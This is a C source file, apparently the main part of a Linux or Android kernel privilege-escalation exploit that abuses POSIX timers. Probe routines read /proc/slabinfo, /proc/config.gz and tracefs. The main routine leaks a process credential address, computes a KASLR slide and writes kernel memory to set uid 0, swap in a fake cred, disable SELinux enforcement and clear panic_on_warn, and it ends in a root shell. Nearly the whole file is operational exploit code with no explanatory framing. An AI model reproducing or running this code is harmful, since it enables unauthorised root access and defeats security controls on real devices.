    fputs("# ", stderr);
    vfprintf(stderr, fmt, ap);
    fputc('\n', stderr);
    va_end(ap);
}

static void probe_slab(void)
{
    static const char *const caches[] = {
        "posix_timers_cache", "cred_jar", "task_struct",
    };
    FILE *f = fopen("/proc/slabinfo", "r");
    char line[512];
    unsigned seen = 0;

    if (!f)
    {
        probe_note("/proc/slabinfo unreadable: %s", strerror(errno));
        return;
    }
    while (fgets(line, sizeof(line), f))
    {
        char name[64];
        unsigned long active, total, objsize, objperslab, pagesperslab;
        size_t i;

        if (sscanf(line, "%63s %lu %lu %lu %lu %lu", name, &active, &total,
                   &objsize, &objperslab, &pagesperslab) != 6)
            continue;
        for (i = 0; i < sizeof(caches) / sizeof(caches[0]); i++)
        {
            if (strcmp(name, caches[i]))
                continue;
            printf("slab.%s.objsize = %lu\n", name, objsize);
            printf("slab.%s.objects = %lu\n", name, total);
            printf("slab.%s.objperslab = %lu\n", name, objperslab);
            printf("slab.%s.pagesperslab = %lu\n", name, pagesperslab);
            seen++;
        }
    }
    fclose(f);
    if (seen < 3)
        probe_note("/proc/slabinfo lacks %u of the three caches", 3 - seen);
}

#ifdef TIMER_NO_ZLIB
static void probe_config(void)
{
    probe_note("/proc/config.gz: built without zlib (TIMER_NO_ZLIB)");
}
#else
static void probe_config(void)
{
    static const char *const wanted[] = {
        "CONFIG_POSIX_TIMERS", "CONFIG_TRACEPOINTS", "CONFIG_FTRACE",
        "CONFIG_TRACING",      "CONFIG_SLUB",        "CONFIG_KALLSYMS",
        "CONFIG_DEBUG_INFO_BTF", "CONFIG_SECURITY_SELINUX", "CONFIG_HZ",
    };
    gzFile gz = gzopen("/proc/config.gz", "rb");
    char line[512];
    unsigned seen = 0;

    if (!gz)
    {
        probe_note("/proc/config.gz unreadable: %s", strerror(errno));
        return;
    }
    while (gzgets(gz, line, sizeof(line)))
    {
        size_t i;

        for (i = 0; i < sizeof(wanted) / sizeof(wanted[0]); i++)
        {
            size_t len = strlen(wanted[i]);

            if (!strncmp(line, wanted[i], len) && line[len] == '=')
            {
                char *value = line + len + 1;

                value[strcspn(value, "\r\n")] = 0;
                printf("config.%s = %s\n", wanted[i], value);
                seen++;
            }
            else if (!strncmp(line, "# ", 2) &&
                     !strncmp(line + 2, wanted[i], len) &&
                     !strncmp(line + 2 + len, " is not set", 11))
            {
                printf("config.%s = n\n", wanted[i]);
                seen++;
            }
        }
    }
    gzclose(gz);
    probe_note("/proc/config.gz read, %u symbols emitted", seen);
}
#endif

static void probe_trace(void)
{
    int dir = access(TR, R_OK | X_OK);
    int trig = access(TR "/events/kmem/rss_stat/trigger", W_OK);
    int raw = access(TR "/per_cpu/cpu0/trace_pipe_raw", R_OK);

    probe_note("tracefs: dir=%s trigger_write=%s raw_read=%s",
               dir == 0 ? "ok" : "missing", trig == 0 ? "ok" : "denied",
               raw == 0 ? "ok" : "denied");
}

static int probe_main(const char *profile_path)
{
    struct utsname u;
    const char *origin = getenv("TIMER_ORIGIN");

    if (uname(&u))
    {
        fprintf(stderr, "[-] uname failed: %s\n", strerror(errno));
        return 1;
    }
    printf("uname = %s\n", u.release);
    printf("origin = %s\n", origin && *origin ? origin : "device");
    probe_slab();
    probe_config();
    probe_trace();
    if (profile_path)
    {
        struct timer_profile profile;
        char err[256];

        if (timer_profile_load(profile_path, &profile, err, sizeof(err)))
        {
            fprintf(stderr, "[-] %s\n", err);
            return 1;
        }
        if (strcmp(profile.release, u.release))
        {
            fprintf(stderr, "[-] profile release %s does not match %s\n",
                    profile.release, u.release);
            return 1;
        }
        probe_note("profile matches the running kernel (%s)", profile.release);
    }
    fflush(stdout);
    return 0;
}

int main(int argc, char **argv)
{
    unsigned char *raw;
    int shell_mode = 0, leak_only = 0, ids_only = 0;
    char release[128] = {0};
    struct timer_profile profile;
    int have_profile = 0;
    int argi = 1;
    const char *profile_path = NULL;
    const char *mode;

    setvbuf(stdout, NULL, _IONBF, 0);
    /* A broken pipe (the arm timeout path, a closed spray socket) must not
     * kill a helper thread. */
    signal(SIGPIPE, SIG_IGN);

    while (argi < argc)
    {
        if (!strcmp(argv[argi], "--profile") && argi + 1 < argc)
        {
            profile_path = argv[argi + 1];
            argi += 2;
            continue;
        }
        if (!strncmp(argv[argi], "--profile=", 10))
        {
            profile_path = argv[argi] + 10;
            argi++;
            continue;
        }
        break;
    }
    mode = argi < argc ? argv[argi] : "";
    {
        const char *sw = getenv("TIMER_SPIN_WAKE");

        if (sw)
            g_spin_wake = atoi(sw) != 0;
    }

    if (!strcmp(mode, "probe"))
        return probe_main(profile_path);

    if (profile_path)
    {
        char err[256];
        struct utsname u;

        g_profile_path = profile_path;
        if (timer_profile_load(profile_path, &profile, err, sizeof(err)))
        {
            fprintf(stderr, "[-] %s\n", err);
            return 1;
        }
        if (uname(&u))
        {
            fprintf(stderr, "[-] uname failed: %s\n", strerror(errno));
            return 1;
        }
        if (strcmp(u.release, profile.release))
        {
            fprintf(stderr,
                    "[-] profile release %s does not match the running kernel %s\n",
                    profile.release, u.release);
            return 1;
        }
        snprintf(release, sizeof(release), "%s", profile.release);
        g_kbuild = &profile.kb;
        g_trigger = profile.trigger ? profile.trigger : TRIGGER_KILLABLE;
        logf("[+] trigger %s\n",
             g_trigger == TRIGGER_CORE_STATE ? "core_state" : "killable");
        have_profile = 1;
        if (profile.has_cred)
            g_cred = profile.cred;
        if (profile.timer_node_off)
            g_timer_node_off = profile.timer_node_off;
        if (profile.has_trace)
        {
            g_page_gfp_off = profile.trace.page_gfp_offset;
            g_page_gfp_size = profile.trace.page_gfp_size;
        }
        logf("[+] trace layout gfp@%#x/%u, node@%#x\n", g_page_gfp_off,
             g_page_gfp_size, g_timer_node_off);
        logf("[+] profile %s (fake constants %s)\n", profile_path,
             profile.has_fake ? "present" : "absent");
    }
    else
    {
        g_kbuild = kbuild_current(release, sizeof(release));
        if (!g_kbuild)
        {
            logf("[-] unsupported kernel: %s\n",
                 release[0] ? release : "(uname failed)");
            logf("[-] known builds:\n");
            kbuild_print_supported(stdout);
            return 1;
        }
    }
    if (!strcmp(mode, "build"))
    {
        logf("[+] running kernel: %s\n", release);
        kbuild_dump(g_kbuild, stdout);
        return 0;
    }
    logf("[+] build %s\n", release);

    if (!strcmp(mode, "wait"))
        return wait_child_main(argi + 1 < argc ? argv[argi + 1] : "verify",
                               argi + 2 < argc ? atoi(argv[argi + 2]) : -1);

    if (!strcmp(mode, "shell"))
        shell_mode = 1;
    if (!strcmp(mode, "leak"))
        leak_only = 1;
    if (!strcmp(mode, "ids"))
        ids_only = 1;
    if (!strcmp(mode, "fake"))
        g_fake_stage = 1;

    if (have_profile)
    {
        if (g_fake_stage && !profile.has_fake)
        {
            logf("[-] the profile carries no fake constants; refusing fake\n");
            return 1;
        }
    }

    raw = malloc(48u << 20);
    if (!raw)
        return 1;
    if (!strcmp(mode, "cpu") && argi + 1 < argc)
        g_victim_pref = atoi(argv[argi + 1]);

    if (argv[0] && argv[0][0] == '\0')
        _exit(42);

    {
        struct rlimit rl;

        if (!getrlimit(RLIMIT_NOFILE, &rl))
        {
            rl.rlim_cur = rl.rlim_max;
            if (rl.rlim_cur > 65536)
                rl.rlim_cur = 65536;
            (void)setrlimit(RLIMIT_NOFILE, &rl);
        }
    }

    derive_cpus();
    logf("[+] pid=%d cpu=%d (victim)\n", getpid(), g_cpus.victim);
    enable_events();
    kick_rss();
    usleep(50000);

    if (init_page_ids(raw) != 0)
        return 1;
    if (ids_only)
        return 0;

    g_base = calibrate_base(raw);
    if (!g_base)
    {
        logf("[-] base calibration failed\n");
        return 1;
    }
    prefill_timers(PREFILL_TIMERS);

    pid_t C = -1;
    int go_fd = -1, st_fd = -1;
    unsigned long long R = leak_cred(raw, &C, &go_fd, &st_fd, shell_mode,
                                     &g_child_task);
    if (!R)
    {
        logf("[-] cred leak failed\n");
        return 1;
    }
    logf("[+] child=%d cred=%#llx target=%#llx\n", C, R, R + 8);
    if (leak_only)
    {
        close(go_fd);
        close(st_fd);
        kill(C, SIGKILL);
        waitpid(C, NULL, 0);
        logf("[+] leak-only run complete\n");
        return 0;
    }
    if (g_fake_stage)
        write_ksu_script();
    ensure_pool();
    ensure_raw();

    if (!g_fake_stage)
    {
        struct plant_res r;
        memset(&r, 0, sizeof(r));
        for (int a = 0; a < 3 && !r.ok; a++)
        {
            logf("[+] plant attempt %d/3\n", a + 1);
            run_plant(R + CRED_UID_OFF, 1, 0, &r, raw);
        }
        if (!r.ok)
            park_forever("no successful plant");
    }
    else
    {
        struct plant_res fc;

        if (!g_child_task)
            park_forever("child task not leaked");
        memset(&fc, 0, sizeof(fc));
        /*
         * The self-parent erase takes the RB_EMPTY_NODE WARN; the target
         * kernel keeps panic_on_warn at 0.  The sysctl is only readable after
         * SELinux is off, so the WARN cannot be gated before this plant.
         *
         * Point task->cred at the reclaimed page.  The fake cred starts at
         * the stale node address; rb_erase dirties uid/gid with the target,
         * so one zero write repairs them.  suid/sgid keep the rb_left
         * target; the fake cred's full CAP_SETUID and euid 0 make that
         * irrelevant for the fork/exec handoff.
         */
        if (stage_write(g_child_task + OFF_TASK_CRED, 2, "fake_cred",
                        raw, &fc))
            park_forever("fake cred write failed");
        if (!g_slide)
            park_forever("no KASLR slide");
        logf("[+] fake cred A=%#llx selinux_state=%#llx\n", fc.A,
             SELINUX_STATE_STATIC + g_slide);
        {
            int sel_ok = 0;

            for (int a = 0; a < 3 && !sel_ok; a++)
            {
                if (stage_write(SELINUX_STATE_STATIC + g_slide - 7, 0,
                                "selinux", raw, NULL))
                    break;
                sel_ok = read_enforce() == 0;
                if (!sel_ok)
                    logf("[!] selinux still enforcing after the write; "
                         "replanting\n");
            }
            if (!sel_ok)
                park_forever("selinux write failed");
        }
        if (read_panic_on_warn() != 0)
        {
            int p_ok = 0;

            for (int a = 0; a < 3 && !p_ok; a++)
            {
                if (stage_write(PANIC_ON_WARN_STATIC + g_slide, 0,
                                "panic_on_warn", raw, NULL))
                    break;
                p_ok = read_panic_on_warn() == 0;
                if (!p_ok)
                    logf("[!] panic_on_warn still set; replanting\n");
            }
            if (!p_ok)
                park_forever("panic_on_warn write failed");
        }
        if (stage_write(fc.A + CRED_UID_OFF, 0, "fake_uid", raw, NULL))
            park_forever("fake uid fix failed");
    }
    logf("[+] cred writes landed, waking child\n");

    if (g_wake_page)
        __atomic_store_n(&g_wake_page[WAKE_GO], 1u, __ATOMIC_RELEASE);
    if (write(go_fd, "A", 1) != 1)
        logf("[!] child wake write failed\n");
    close(go_fd);

    {
        struct child_report rep;
        struct pollfd pf = {.fd = st_fd, .events = POLLIN};
        ssize_t rn = -1;

        if (poll(&pf, 1, 10000) > 0)
            rn = read(st_fd, &rep, sizeof(rep));
        close(st_fd);
        if (rn == (ssize_t)sizeof(rep) && rep.magic == CHILD_MAGIC)
        {
            logf("[+] child report uid=%d euid=%d setuid(0)=%d errno=%d resuid=%d/%d/%d\n",
                 rep.uid, rep.euid, rep.setuid_ret, rep.setuid_errno,
                 rep.ruid, rep.reuid, rep.rsuid);
            if (rep.setuid_ret != 0 || rep.reuid != 0)
                logf("[!] child did not reach euid 0\n");
        }
        else
        {
            logf("[!] child report missing (n=%zd)\n", rn);
        }
    }

    {
        int st = 0;

        if (waitpid(C, &st, 0) == C)
            logf("[+] child exit status=%#x\n", st);
    }
    if (g_fake_stage)
        hold_forever();
    if (g_held)
        park_forever("root shell finished; failed-plant zombies are held");
    logf("[+] done\n");
    return 0;
}
